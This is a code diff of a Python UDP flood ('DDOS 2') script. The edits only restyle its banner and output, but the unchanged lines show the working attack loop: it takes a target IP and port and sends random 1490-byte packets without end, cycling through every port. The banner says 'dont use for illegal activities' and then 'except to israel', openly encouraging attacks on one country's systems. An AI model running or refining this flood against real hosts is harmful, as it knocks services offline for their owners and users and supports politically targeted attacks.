@@ -21,13 +21,13 @@ bytes = random._urandom(1490)
 os.system("clear")
 
 #terminal display DDOS 2 as figlet
-os.system("figlet DDOS 2")
+os.system("figlet -f mono12 DDOS2")
 
 #display text use echo
-os.system("echo 'dont use for illegal activities'")
+os.system("      echo 'dont use for illegal activities'")
 time.sleep(1)
 
-os.system("echo 'except to israel'")
+os.system("      echo 'except to israel'")
 time.sleep(2)
 #Bannerku
 banner="""
@@ -38,7 +38,11 @@ banner="""
 |------------------------------------|
 """
 #display bannerku
-print(\033[32m banner)
+
+GREEN   = '\033[32m'
+CYAN    = '\033[46m'
+
+print(GREEN+banner)
 
 ip = raw_input("Masukkan Ip : ")
 port = input("Masukkan Port : ")
@@ -47,10 +51,10 @@ port = input("Masukkan Port : ")
 os.system("clear")
 
 time.sleep(0.5)
-os.system("echo 'Attack Starting...'")
-
+os.system("echo '....Attack Starting....'")
+os.system("clear")
 time.sleep(1)
-print("Wait a seccond...")
+print("....Wait a seccond...")
 time.sleep(0.5)
 
 sent = 0
@@ -58,7 +62,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "\033[36m sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "\033[46m sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 #Maaf jika ada Kesalahan , tolong tegur :)
